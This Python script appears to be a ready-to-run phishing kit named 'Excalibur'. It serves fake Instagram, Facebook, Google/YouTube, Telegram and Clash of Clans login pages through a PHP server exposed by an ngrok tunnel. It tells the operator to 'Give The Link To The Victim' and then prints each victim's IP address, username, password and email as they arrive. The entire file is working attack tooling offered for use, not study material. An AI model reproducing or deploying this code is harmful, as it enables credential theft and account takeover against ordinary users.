# Excalibur Phishing Tool Made By FireKing255
# Copyright C 2021 by FireKing255
# Tool Version: 1.0.0

from colorama.ansi import clear_line
from pyngrok import ngrok
from subprocess import Popen
from colorama import Fore
import time
import os
import Sword

# <Code>
# 016
def Credit():
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"c"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Made By FireKing255 | Copyright © 2021 by FireKing255 \n\n\t- Telegram: @FireKing255\n\t- Github: https://github.com/fireking255/\n\n")
    Menu();

# 07 -=- Empty
def Empty():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Empty :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/07/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/07/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/07/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/07/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        while True:
            IP();
            time.sleep(1)

# 06 -=- Clash Of Clans Hacker
def ClashOfClans():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake Clash of Clans Hacker :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/06/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/06/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/06/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/06/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        # UserName & Password
        def UP():
            FS = 0
            if not int(os.stat('index/06/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('index/06/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('index/06/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()

                #email
                e_file = open('index/06/e_data.txt', 'r')
                e = e_file.read()
                e_file.close()

                #print
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password / Email Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Email :",e+"\n")

                #clear-username
                u_clear = open('index/06/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('index/06/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()

                #clear-email
                e_clear = open('index/06/e_data.txt', 'w')
                e_clear.write('')
                e_clear.close()

        while True:
            IP();
            UP();
            time.sleep(1)

# 05 -=- Free Telegram Members
def TeleMembers():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake Free Telegram Members :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/05/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/05/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/05/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/05/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        # UserName & Password
        def UP():
            FS = 0
            if not int(os.stat('index/05/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('index/05/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('index/05/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()

                #email
                e_file = open('index/05/e_data.txt', 'r')
                e = e_file.read()
                e_file.close()

                #print
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password / Email Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Email :",e+"\n")

                #clear-username
                u_clear = open('index/05/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('index/05/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()

                #clear-email
                e_clear = open('index/05/e_data.txt', 'w')
                e_clear.write('')
                e_clear.close()

        while True:
            IP();
            UP();
            time.sleep(1)
            
# 04 -=- Instagram 
def FakeInstaFollowers():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake Instagram Followers :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/04/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/04/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/04/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/04/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        # UserName & Password
        def UP():
            FS = 0
            if not int(os.stat('index/04/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('index/04/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('index/04/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()

                #email
                e_file = open('index/04/e_data.txt', 'r')
                e = e_file.read()
                e_file.close()

                #print
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password / Email Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Email :",e+"\n")

                #clear-username
                u_clear = open('index/04/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('index/04/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()

                #clear-email
                e_clear = open('index/04/e_data.txt', 'w')
                e_clear.write('')
                e_clear.close()

        while True:
            IP();
            UP();
            time.sleep(1)

# 03 -=- Fake YouTube
def FakeYouTube():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake YouTube Login (Google) :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/03/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/03/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/03/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/03/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        # UserName & Password
        def UP():
            FS = 0
            if not int(os.stat('index/03/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('index/03/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('index/03/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()

                #print
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")

                #clear-username
                u_clear = open('index/03/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('index/03/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()

        while True:
            IP();
            UP();
            time.sleep(1)

# 02 -=- Fake Facebook
def FakeFaceBook():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake FaceBook :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/02/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/02/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/02/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/02/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        # UserName & Password
        def UP():
            FS = 0
            if not int(os.stat('index/02/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('index/02/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('index/02/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()

                #print
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")

                #clear-username
                u_clear = open('index/02/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('index/02/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()

        while True:
            IP();
            UP();
            time.sleep(1)

# 01 -=- Fake Instagram
def FakeInsta():
    # Start
    Sword.Sword()
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"@"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Fake Instagram :")
    print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"$"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Loading...", end="")
    with open("log/server.txt", "w") as phplog:
        Popen(("php","-S","localhost:6060","-t","index/01/"),stderr=phplog,stdout=phplog)
        Link = ngrok.connect(6060, "http")
        print("\b"*11+Fore.LIGHTCYAN_EX+" Link |", str(Link).replace("nel: \"http:","nel: \"https:"))
        print("\n"+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Give The Link To The Victim\n")

        # Internet Protocol
        def IP():
            FS = 0
            if not int(os.stat('index/01/ip_data.txt').st_size) == int(FS):
                ip_file = open('index/01/ip_data.txt', 'r')
                ip = ip_file.read()
                ip_file.close()
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" IP : "+ip+"\n")
                ip_clear = open('index/01/ip_data.txt', 'w')
                ip_clear.write('')
                ip_clear.close()

        # UserName & Password
        def UP():
            FS = 0
            if not int(os.stat('index/01/u_data.txt').st_size) == int(FS):
                #password
                p_file = open('index/01/p_data.txt', 'r')
                p = p_file.read()
                p_file.close()

                #username
                u_file = open('index/01/u_data.txt', 'r')
                u = u_file.read()
                u_file.close()

                #print
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"!"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" UserName / Password Found!\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" User Name :",u+"\n")
                print(Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"~"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTCYAN_EX+" Password :",p+"\n")

                #clear-username
                u_clear = open('index/01/u_data.txt', 'w')
                u_clear.write('')
                u_clear.close()

                #clear-password
                p_clear = open('index/01/p_data.txt', 'w')
                p_clear.write('')
                p_clear.close()

        while True:
            IP();
            UP();
            time.sleep(1)

# Menu
def Menu():
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"01"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Fake Instagram    "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"02"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Fake FaceBook     "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"03"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Fake YouTube     ")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"04"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Insta Follower    "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"05"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Telegram Members  "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"06"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Clash Of Clans   ")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"07"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Empty (Ip Only)   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"08"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"09"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"-----------------")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"10"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"11"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"12"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"-----------------")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"13"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"14"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"----------------- "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"15"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"-----------------")
    print("\t   "+Fore.LIGHTGREEN_EX+"["+Fore.LIGHTMAGENTA_EX+"16"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Credit...         "+"["+Fore.LIGHTMAGENTA_EX+"00"+Fore.LIGHTGREEN_EX+"]"+Fore.LIGHTYELLOW_EX+"Exit...          ")
    print("\n")
    MenuOption = input(Fore.LIGHTGREEN_EX+" ┌─["+Fore.LIGHTCYAN_EX+"Excalibur"+Fore.LIGHTYELLOW_EX+"~"+Fore.LIGHTMAGENTA_EX+"@HOME"+Fore.LIGHTGREEN_EX+"""]
 └──╼ """+Fore.LIGHTYELLOW_EX+"$ ")

    MenuOption = int(MenuOption)

    if(MenuOption == 1):
        FakeInsta();
    elif(MenuOption == 2):
        FakeFaceBook();
    elif(MenuOption == 3):
        FakeYouTube();
    elif(MenuOption == 4):
        FakeInstaFollowers();
    elif(MenuOption == 5):
        TeleMembers();
    elif(MenuOption == 6):
        ClashOfClans();
    elif(MenuOption == 7):
        Empty();
    elif(MenuOption == 16):
        Credit();
    else:
        exit()

# Banner
def Banner():
    print()
    print("   "+Fore.LIGHTMAGENTA_EX+".    "+Fore.LIGHTCYAN_EX+"                                                                           "+Fore.LIGHTMAGENTA_EX+". ")
    print("  "+Fore.LIGHTMAGENTA_EX+"/ \\  "+Fore.LIGHTCYAN_EX+"                                                                           "+Fore.LIGHTMAGENTA_EX+"/ \\")
    print("  "+Fore.LIGHTMAGENTA_EX+"| |   "+Fore.LIGHTCYAN_EX+"  ________                        __    _   __                            "+Fore.LIGHTMAGENTA_EX+"| |")
    print("  "+Fore.LIGHTMAGENTA_EX+"| |   "+Fore.LIGHTCYAN_EX+" |_   __  |                      [  |  (_) [  |                           "+Fore.LIGHTMAGENTA_EX+"| |")
    print("  "+Fore.LIGHTMAGENTA_EX+"|.|   "+Fore.LIGHTCYAN_EX+"   | |_ \_| _   __  .---.  ,--.   | |  __   | |.--.   __   _   _ .--.     "+Fore.LIGHTMAGENTA_EX+"|.|")
    print("  "+Fore.LIGHTMAGENTA_EX+"|.|   "+Fore.LIGHTCYAN_EX+"   |  _| _ [ \ [  ]/ /'`\]`'_\ :  | | [  |  | '/'`\ \[  | | | [ `/'`\]    "+Fore.LIGHTMAGENTA_EX+"|.|")
    print("  "+Fore.LIGHTMAGENTA_EX+"|:|   "+Fore.LIGHTCYAN_EX+"  _| |__/ | > '  < | \__. // | |, | |  | |  |  \__/ | | \_/ |, | |        "+Fore.LIGHTMAGENTA_EX+"|:|")
    print("  "+Fore.LIGHTMAGENTA_EX+"|:|   "+Fore.LIGHTCYAN_EX+" |________|[__]`\_]'.___.'\\'-;__/[___][___][__;.__.'  '.__.'_/[___]       "+Fore.LIGHTMAGENTA_EX+"|:|")
    print(Fore.LIGHTGREEN_EX+"`--8--' "+Fore.LIGHTCYAN_EX+"                           ¯¯¯                                          "+Fore.LIGHTGREEN_EX+"`--8--'")
    print("   "+Fore.LIGHTGREEN_EX+"8      "+Fore.WHITE+"Excalibur Phishing Tool Made By FireKing255 - Telegram:@FireKing255      "+Fore.LIGHTGREEN_EX+"8")
    print("   "+Fore.LIGHTGREEN_EX+"0                                                                               "+Fore.LIGHTGREEN_EX+"0")

# </Code>

# Fixing Errors Then Start
# clear-S
clear_s = open('log/server.txt', 'w')
clear_s.write("")
clear_s.close()
# clear-1
clear_1 = open('index/01/ip_data.txt','w')
clear_1.write("")
clear_1.close()
clear_1_u = open('index/01/u_data.txt', 'w')
clear_1_u.write("")
clear_1_u.close()
clear_1_p = open('index/01/p_data.txt', 'w')
clear_1_p.write("")
clear_1_p.close()
# clear-2
clear_2 = open('index/02/ip_data.txt','w')
clear_2.write("")
clear_2.close()
clear_2_u = open('index/02/u_data.txt', 'w')
clear_2_u.write("")
clear_2_u.close()
clear_2_p = open('index/02/p_data.txt', 'w')
clear_2_p.write("")
clear_2_p.close()
# clear-3
clear_3 = open('index/03/ip_data.txt','w')
clear_3.write("")
clear_3.close()
clear_3_u = open('index/03/u_data.txt', 'w')
clear_3_u.write("")
clear_3_u.close()
clear_3_p = open('index/03/p_data.txt', 'w')
clear_3_p.write("")
clear_3_p.close()
# clear-4
clear_4 = open('index/04/ip_data.txt','w')
clear_4.write("")
clear_4.close()
clear_4_u = open('index/04/u_data.txt', 'w')
clear_4_u.write("")
clear_4_u.close()
clear_4_p = open('index/04/p_data.txt', 'w')
clear_4_p.write("")
clear_4_p.close()
clear_4_e = open('index/04/e_data.txt', 'w')
clear_4_e.write("")
clear_4_e.close()
# clear-5
clear_5 = open('index/05/ip_data.txt','w')
clear_5.write("")
clear_5.close()
clear_5_u = open('index/05/u_data.txt', 'w')
clear_5_u.write("")
clear_5_u.close()
clear_5_p = open('index/05/p_data.txt', 'w')
clear_5_p.write("")
clear_5_p.close()
clear_5_e = open('index/05/e_data.txt', 'w')
clear_5_e.write("")
clear_5_e.close()
# clear-6
clear_6 = open('index/06/ip_data.txt','w')
clear_6.write("")
clear_6.close()
clear_6_u = open('index/06/u_data.txt', 'w')
clear_6_u.write("")
clear_6_u.close()
clear_6_p = open('index/06/p_data.txt', 'w')
clear_6_p.write("")
clear_6_p.close()
clear_6_e = open('index/06/e_data.txt', 'w')
clear_6_e.write("")
clear_6_e.close()
# clear-6
clear_7 = open('index/07/ip_data.txt','w')
clear_7.write("")
clear_7.close()

time.sleep(0.5)
os.system('killall -9 php')
os.system('clear')
Banner();
Menu();

#   .
#  / \
#  | |
#  | |
#  |.|
#  |.|
#  |:|
#  |:|
#`--8--'
#   8
#   O